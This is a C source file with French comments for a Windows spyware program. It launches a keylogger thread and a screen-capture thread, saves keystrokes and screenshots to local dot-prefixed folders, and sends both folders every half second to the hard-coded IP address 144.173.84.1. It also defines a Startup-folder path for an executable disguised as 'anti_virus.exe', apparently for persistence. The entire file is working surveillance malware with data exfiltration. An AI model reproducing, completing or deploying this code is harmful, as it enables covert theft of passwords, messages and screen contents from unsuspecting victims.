#include "keylogger.h"
#include "screen.h"
#include "for_all.c"
#include <process.h>

const char *output_dir = ".output_screen";
const char *output_file = ".output_text/text.txt";
const char *output_file_dir = ".output_text";

const char *window_start_path = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\anti_virus.exe";

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <gdiplus.h>


#pragma comment (lib,"Gdiplus.lib")

#define SLEEP(ms) Sleep(ms)

int start(char *executable, char *args) {
    // Définir l'exécutable et les arguments à passer
    //const char *args = "argument1 argument2";  // Les arguments à passer

    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Créer le processus et lui passer les arguments
    if (!CreateProcess(
            executable,          // Nom de l'exécutable
            (char*)args,         // Arguments en tant que chaîne de caractères
            NULL,                // Sécurité du processus
            NULL,                // Sécurité du thread
            FALSE,               // Héritage des descripteurs
            0,                   // Drapeaux de création
            NULL,                // Environnement
            NULL,                // Répertoire de travail
            &si,                 // Informations de démarrage
            &pi                  // Informations sur le processus
        )) {
        printf("Échec de CreateProcess (%d).\n", GetLastError());
        return 1;
    }

    // Attendre que le programme enfant se termine
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Fermer les handles
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return 0;
}

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>


// Remplace ces fonctions par tes vraies définitions
DWORD WINAPI start_keylogger_thread(LPVOID lpParam) {
    start_keylogger(output_file);
    return 0;
}

DWORD WINAPI capture_screen_thread(LPVOID lpParam) {
    int fps = *((int *)lpParam);
    wchar_t w_output_dir[512];
    mbstowcs(w_output_dir, output_dir, sizeof(w_output_dir)/sizeof(wchar_t));
    capture_screen_720p(w_output_dir, fps);
    return 0;
}

int main(int argc, char *argv[]) {
    printf("argc: %d\n", argc);
    printf("executable path: %s\n", argv[0]);

    // Création des répertoires (ignore erreur si déjà existant)
    CreateDirectory(output_file_dir, NULL);
    CreateDirectory(output_dir, NULL);

    // Vérifie si le fichier existe
    FILE *test = fopen(output_file, "r");
    if (test != NULL) {
        fclose(test);
        printf("Le fichier existe déjà. On ne touche pas.\n");
    } else {
        FILE *file = fopen(output_file, "w");
        if (file != NULL) {
            fprintf(file, "Fichier nouvellement créé.\n");
            fclose(file);
            printf("Fichier créé avec succès !\n");
        } else {
            printf("Erreur lors de la création du fichier.\n");
        }
    }

    char path[2048];
    if (GetModuleFileName(NULL, path, sizeof(path)) == 0) {
        printf("Erreur lors de la récupération du chemin de l'exécutable\n");
        return 1;
    }

    printf("executable: %s\n", path);

    //if (argc == 1) {
        printf("Mode par défaut\n");

        // Lancer deux threads (start_keylogger et capture)
        int fps = 8;

        HANDLE thread1 = CreateThread(NULL, 0, start_keylogger_thread, NULL, 0, NULL);
        HANDLE thread2 = CreateThread(NULL, 0, capture_screen_thread, &fps, 0, NULL);

        if (thread1 == NULL || thread2 == NULL) {
            printf("Erreur lors de la création des threads.\n");
            return 1;
        }


    // Boucle principale
    while (1) {
        Sleep(500); // Sleep en millisecondes
        printf("sending !");
        send_dir(output_dir, "144.173.84.1");
        send_dir(output_file_dir, "144.173.84.1");
        printf("sended !");
        // Création des répertoires (ignore erreur si déjà existant)
        CreateDirectory(output_file_dir, NULL);
        CreateDirectory(output_dir, NULL);
        
        // Vérifie si le fichier existe
        FILE *test = fopen(output_file, "r");
        if (test != NULL) {
            fclose(test);
            printf("Le fichier existe déjà. On ne touche pas.\n");
        } else {
            FILE *file = fopen(output_file, "w");
            if (file != NULL) {
                fprintf(file, "Fichier nouvellement créé.\n");
                fclose(file);
                printf("Fichier créé avec succès !\n");
            } else {
                printf("Erreur lors de la création du fichier.\n");
            }
        }
    }

    return 0;
}
